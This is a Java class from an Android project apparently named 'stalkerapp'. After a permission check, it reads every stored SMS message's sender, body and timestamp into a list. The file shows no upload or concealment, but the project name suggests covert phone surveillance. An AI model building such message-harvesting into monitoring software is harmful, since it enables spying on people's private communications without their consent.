package com.github.saintedlittle.stalkerapp.fetcher;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;

import androidx.core.content.ContextCompat;

import com.github.saintedlittle.stalkerapp.data.SMSData;

import java.util.ArrayList;
import java.util.List;

public class SMSFetcher {

    private static final String SMS_URI_ALL = "content://sms/";

    public static List<SMSData> fetchSMS(Context context) {
        List<SMSData> smsList = new ArrayList<>();

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            return smsList;
        }

        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(Uri.parse(SMS_URI_ALL), null, null, null, null);

        if (cursor != null) {
            try {
                if (cursor.moveToFirst()) {
                    do {
                        String sender = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String message = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));

                        SMSData smsData = new SMSData(sender, message, timestamp);
                        smsList.add(smsData);
                    } while (cursor.moveToNext());
                }
            } finally {
                cursor.close();
            }
        }

        return smsList;
    }
}
